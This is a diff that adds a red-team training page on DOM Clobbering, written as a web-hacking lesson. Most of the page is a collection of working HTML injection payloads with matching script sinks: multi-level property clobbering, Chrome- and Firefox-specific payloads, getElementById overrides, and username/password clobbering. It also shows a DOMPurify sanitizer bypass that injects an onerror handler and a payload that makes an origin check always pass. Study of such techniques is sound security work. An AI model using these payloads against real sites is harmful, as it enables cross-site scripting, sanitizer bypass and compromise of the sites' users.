@@ -1,0 +1,160 @@
+---
+layout: training-page
+title: "DOM Clobbering — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - dom-clobbering
+  - xss
+  - html-injection
+  - javascript
+page_key: "web-dom-clobbering"
+---
+<h1>DOM Clobbering</h1>
+<p>
+  DOM Clobbering is a technique where named HTML elements — specifically those with <code>id</code>
+  or <code>name</code> attributes — overwrite global JavaScript variables or object properties.
+  Browsers expose certain HTML elements as properties of <code>window</code> or <code>document</code>,
+  and when a script later references those names, it reads the DOM element rather than the expected
+  JavaScript value. This can hijack application logic, bypass sanitizers, and enable XSS.
+</p>
+<p>
+  Exploitation requires the ability to inject arbitrary HTML into the page (HTML injection). DOM
+  Clobbering does not require direct script injection — only markup injection.
+</p>
+
+<h2>Tools</h2>
+<ul>
+  <li>domclob.xyz — comprehensive browser-specific payload list — <code>domclob.xyz/domc_markups/list</code></li>
+  <li>yeswehack/Dom-Explorer — test HTML parsers and sanitizers — <code>github.com/yeswehack/Dom-Explorer</code></li>
+</ul>
+
+<h2>Core Payloads</h2>
+
+<h3>Clobbering x.y.value (2 levels)</h3>
+<pre><code>&lt;!-- Payload: inject this HTML --&gt;
+&lt;form id=x&gt;&lt;output id=y&gt;I've been clobbered&lt;/output&gt;&lt;/form&gt;
+
+&lt;!-- Sink: script already in page reads this value --&gt;
+&lt;script&gt;alert(x.y.value);&lt;/script&gt;</code></pre>
+
+<h3>Clobbering x.y using HTMLCollection (id + name)</h3>
+<p>
+  When two elements share the same <code>id</code>, the browser creates an HTMLCollection.
+  A second element with a <code>name</code> attribute on the same collection becomes a named property.
+</p>
+<pre><code>&lt;!-- Payload --&gt;
+&lt;a id=x&gt;&lt;/a&gt;&lt;a id=x name=y href="Clobbered"&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;alert(x.y)&lt;/script&gt;</code></pre>
+
+<h3>3-Level Deep Clobbering (x.y.z)</h3>
+<pre><code>&lt;!-- Payload --&gt;
+&lt;form id=x name=y&gt;&lt;input id=z&gt;&lt;/form&gt;
+&lt;form id=x&gt;&lt;/form&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;alert(x.y.z)&lt;/script&gt;</code></pre>
+
+<h3>4+ Level Deep Clobbering via iframe srcdoc</h3>
+<pre><code>&lt;!-- Payload — uses nested iframes with srcdoc --&gt;
+&lt;iframe name=a srcdoc="
+  &lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;
+"&gt;&lt;/iframe&gt;
+&lt;style&gt;@import '//portswigger.net';&lt;/style&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;alert(a.b.c.d)&lt;/script&gt;</code></pre>
+
+<h3>Clobbering forEach (Chrome only)</h3>
+<pre><code>&lt;!-- Payload --&gt;
+&lt;form id=x&gt;
+  &lt;input id=y name=z&gt;
+  &lt;input id=y&gt;
+&lt;/form&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;x.y.forEach(element =&gt; alert(element))&lt;/script&gt;</code></pre>
+
+<h3>Clobbering document.getElementById()</h3>
+<p>
+  Using <code>&lt;html&gt;</code> or <code>&lt;body&gt;</code> tags with matching IDs can override
+  what <code>getElementById</code> returns.
+</p>
+<pre><code>&lt;!-- Payloads --&gt;
+&lt;html id="cdnDomain"&gt;clobbered&lt;/html&gt;
+&lt;svg&gt;&lt;body id=cdnDomain&gt;clobbered&lt;/body&gt;&lt;/svg&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;
+  alert(document.getElementById('cdnDomain').innerText); // clobbered
+&lt;/script&gt;</code></pre>
+
+<h3>Clobbering x.username and x.password</h3>
+<p>
+  Anchor elements expose <code>username</code> and <code>password</code> properties parsed from
+  the href URL. This can clobber authentication-related variables.
+</p>
+<pre><code>&lt;!-- Payload --&gt;
+&lt;a id=x href="ftp:Clobbered-username:Clobbered-Password@a"&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;
+  alert(x.username); // Clobbered-username
+  alert(x.password); // Clobbered-password
+&lt;/script&gt;</code></pre>
+
+<h3>Firefox-Specific Payload</h3>
+<pre><code>&lt;!-- Payload --&gt;
+&lt;base href=a:abc&gt;&lt;a id=x href="Firefox&lt;&gt;"&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;
+  alert(x); // Firefox&lt;&gt;
+&lt;/script&gt;</code></pre>
+
+<h3>Chrome-Specific Payload</h3>
+<pre><code>&lt;!-- Payload --&gt;
+&lt;base href="a://Clobbered&lt;&gt;"&gt;&lt;a id=x name=x&gt;&lt;a id=x name=xyz href=123&gt;
+
+&lt;!-- Sink --&gt;
+&lt;script&gt;
+  alert(x.xyz); // a://Clobbered&lt;&gt;
+&lt;/script&gt;</code></pre>
+
+<h2>Bypassing Sanitizers (DOMPurify)</h2>
+<p>
+  DOMPurify allows the <code>cid:</code> protocol, which does not encode double quotes.
+  This can be leveraged to inject event handlers through clobbered attributes:
+</p>
+<pre><code>&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href="cid:&amp;quot;onerror=alert(1)//"&gt;</code></pre>
+<p>
+  When a script reads <code>defaultAvatar.avatar</code>, it gets the href value. If the application
+  then uses this as an image src, the unencoded quote breaks out and injects <code>onerror=alert(1)</code>.
+</p>
+
+<h2>Attack Scenarios</h2>
+<h3>Bypassing Security Checks</h3>
+<p>
+  If an application uses a pattern like <code>if (!config.allowedOrigins) { ... }</code> and
+  <code>config</code> is sourced from a global that can be clobbered, injecting
+  <code>&lt;a id=config name=allowedOrigins href=x&gt;</code> makes the check always pass.
+</p>
+
+<h3>Script Gadget Exploitation</h3>
+<p>
+  Many JavaScript frameworks contain "gadgets" — code paths that read DOM properties and execute
+  them. DOM Clobbering can feed attacker-controlled values into these gadgets without direct script
+  injection, bypassing CSP in some cases.
+</p>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings DOM Clobbering — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering</code></li>
+  <li>PortSwigger DOM Clobbering — <code>portswigger.net/web-security/dom-based/dom-clobbering</code></li>
+  <li>domclob.xyz payload list — <code>domclob.xyz/domc_markups/list</code></li>
+  <li>Dom-Explorer tool — <code>github.com/yeswehack/Dom-Explorer</code></li>
+  <li>DOM Clobbering strikes back (Gareth Heyes) — <code>portswigger.net/research/dom-clobbering-strikes-back</code></li>
+  <li>Bypassing CSP via DOM Clobbering — <code>portswigger.net/research/bypassing-csp-via-dom-clobbering</code></li>
+  <li>Hijacking service workers via DOM Clobbering — <code>portswigger.net/research/hijacking-service-workers-via-dom-clobbering</code></li>
+</ul>
